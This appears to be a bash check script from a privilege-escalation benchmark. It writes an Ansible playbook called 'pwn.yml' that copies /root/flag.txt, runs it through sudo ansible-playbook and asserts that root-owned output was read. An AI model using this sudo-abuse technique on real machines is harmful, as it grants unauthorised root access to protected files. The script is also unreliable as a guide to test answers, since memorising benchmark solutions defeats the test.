#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/ansible_flag
cat > /opt/bench/ansible/pwn.yml <<'\''EOF'\''
---
- hosts: localhost
  connection: local
  tasks:
    - name: pwn
      ansible.builtin.shell: cat /root/flag.txt > /tmp/ansible_flag
EOF
sudo /usr/bin/ansible-playbook /opt/bench/ansible/pwn.yml >/dev/null 2>&1
test -r /tmp/ansible_flag && cat /tmp/ansible_flag
')"
assert_root_output "${out}"
